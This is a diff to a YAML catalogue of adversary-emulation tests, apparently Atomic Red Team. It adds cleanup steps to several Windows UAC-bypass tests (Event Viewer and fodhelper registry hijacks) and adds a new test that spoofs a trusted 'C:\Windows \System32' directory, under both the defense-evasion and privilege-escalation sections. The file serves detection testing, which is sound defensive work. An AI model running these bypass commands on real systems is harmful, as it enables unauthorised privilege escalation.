@@ -5733,6 +5733,9 @@ defense-evasion:
         command: |
           reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "#{executable_binary}" /f
           cmd.exe /c eventvwr.msc
+        cleanup_command: 'reg.exe delete hkcu\software\classes\mscfile /f
+
+'
     - name: Bypass UAC using Event Viewer - PowerShell
       description: 'PowerShell code to bypass User Account Control using Event Viewer
         and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
@@ -5751,6 +5754,9 @@ defense-evasion:
           New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force
           Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
           Start-Process "C:\Windows\System32\eventvwr.msc"
+        cleanup_command: 'Remove-Item "HKCU:\software\classes\mscfile" -force -Recurse
+
+'
     - name: Bypass UAC using Fodhelper
       description: 'Bypasses User Account Control using the Windows 10 Features on
         Demand Helper (fodhelper.exe). Requires Windows 10.
@@ -5770,6 +5776,9 @@ defense-evasion:
           reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "#{executable_binary}" /f
           reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute"
           fodhelper.exe
+        cleanup_command: 'reg.exe delete hkcu\software\classes\ms-settings /f
+
+'
     - name: Bypass UAC using Fodhelper - PowerShell
       description: 'PowerShell code to bypass User Account Control using the Windows
         10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
@@ -5814,7 +5823,33 @@ defense-evasion:
           New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
           Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
           Start-Process "C:\Windows\System32\ComputerDefaults.exe"
-        cleanup_command: Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse
+        cleanup_command: 'Remove-Item "HKCU:\software\classes\ms-settings" -force
+          -Recurse
+
+'
+    - name: Bypass UAC by Mocking Trusted Directories
+      description: 'Creates a fake "trusted directory" and copies a binary to bypass
+        UAC. The UAC bypass may not work on fully patched systems, however the directory
+        structure will be created.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        executable_binary:
+          description: Binary to execute with UAC Bypass
+          type: path
+          default: C:\Windows\System32\cmd.exe
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: |
+          mkdir "\\?\C:\Windows \System32\"
+          copy "#{executable_binary}" "\\?\C:\Windows \System32\mmc.exe"
+          mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"
+        cleanup_command: |
+          rd "\\?\C:\Windows \" /S /Q
+          del "c:\testbypass.exe"
   T1191:
     technique:
       x_mitre_data_sources:
@@ -12679,6 +12714,9 @@ privilege-escalation:
         command: |
           reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "#{executable_binary}" /f
           cmd.exe /c eventvwr.msc
+        cleanup_command: 'reg.exe delete hkcu\software\classes\mscfile /f
+
+'
     - name: Bypass UAC using Event Viewer - PowerShell
       description: 'PowerShell code to bypass User Account Control using Event Viewer
         and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
@@ -12697,6 +12735,9 @@ privilege-escalation:
           New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force
           Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
           Start-Process "C:\Windows\System32\eventvwr.msc"
+        cleanup_command: 'Remove-Item "HKCU:\software\classes\mscfile" -force -Recurse
+
+'
     - name: Bypass UAC using Fodhelper
       description: 'Bypasses User Account Control using the Windows 10 Features on
         Demand Helper (fodhelper.exe). Requires Windows 10.
@@ -12716,6 +12757,9 @@ privilege-escalation:
           reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "#{executable_binary}" /f
           reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute"
           fodhelper.exe
+        cleanup_command: 'reg.exe delete hkcu\software\classes\ms-settings /f
+
+'
     - name: Bypass UAC using Fodhelper - PowerShell
       description: 'PowerShell code to bypass User Account Control using the Windows
         10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
@@ -12760,7 +12804,33 @@ privilege-escalation:
           New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
           Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
           Start-Process "C:\Windows\System32\ComputerDefaults.exe"
-        cleanup_command: Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse
+        cleanup_command: 'Remove-Item "HKCU:\software\classes\ms-settings" -force
+          -Recurse
+
+'
+    - name: Bypass UAC by Mocking Trusted Directories
+      description: 'Creates a fake "trusted directory" and copies a binary to bypass
+        UAC. The UAC bypass may not work on fully patched systems, however the directory
+        structure will be created.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        executable_binary:
+          description: Binary to execute with UAC Bypass
+          type: path
+          default: C:\Windows\System32\cmd.exe
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: |
+          mkdir "\\?\C:\Windows \System32\"
+          copy "#{executable_binary}" "\\?\C:\Windows \System32\mmc.exe"
+          mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"
+        cleanup_command: |
+          rd "\\?\C:\Windows \" /S /Q
+          del "c:\testbypass.exe"
   T1038:
     technique:
       x_mitre_permissions_required:
@@ -26815,6 +26885,6 @@ initial-access:
       - windows
       executor:
         name: powershell
-        command: 'Start-Process PathToAtomicsFolder\T1193\src\PowerShell_IP_Doc.doc
+        command: 'Start-Process $PathToAtomicsFolder\T1193\bin\PowerShell_IP_Doc.doc
 
 '
